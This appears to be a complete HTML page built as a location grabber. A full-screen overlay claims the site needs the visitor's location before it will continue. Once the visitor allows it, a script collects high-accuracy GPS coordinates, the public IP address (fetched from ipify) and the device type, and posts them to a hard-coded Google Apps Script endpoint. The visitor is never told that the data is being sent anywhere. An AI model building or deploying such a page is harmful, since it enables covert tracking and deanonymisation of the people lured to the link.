<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website</title>
    <style>
        #blocker {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div id="blocker">
        <h2>This site need your location to continue</h2>
        <button onclick="requestLocation()">Allow Location</button>
        <p id="status" style="color: red;"></p>
    </div>
    <script>
    async function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        //1. Declare 'device' outside the if block
                        let device = (window.innerWidth <= 768) ? "Mobile" : "Not_Mobile";

                        //2. Get IP using fetch and await
                        let ip = "Unknown";
                        try {
                            const res = await fetch('https://api.ipify.org?format=json');
                            const data = await res.json();
                            ip = data.ip;
                        } catch (err) {
                            ip = "Error: " + err;
                        }

                        //3. Get location
                        const location = `${position.coords.latitude},${position.coords.longitude}`;

                        //4. Prepare and send
                        const scriptURL = "https://script.google.com/macros/s/AKfycbwY5gb6jhtCT1mG95Cw2uKvlU4J81AhPGdsShVW7sDTArn_AiHM7yqzQZbppaDU2D4L/exec";
                        const formData = new FormData();
                        formData.append("device", device);
                        formData.append("ip", ip);
                        formData.append("location", location);

                        try {
                            const response = await fetch(scriptURL, {
                                method: "POST",
                                body: formData
                            });
                            const text = await response.text();
                            document.getElementById("status").innerText = "✅ Data submitted!";
                        } catch (error) {
                            document.getElementById("status").innerText = "❌ Data not submitted. Error: " + error;
                        }
                    },
                    (error) => {
                        document.getElementById("status").innerText = "Error retrieving position: " + error.code + " - " + error.message;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("status").innerText = "❌ Geolocation is not supported";
            }
    }
</script>
</body>
</html>
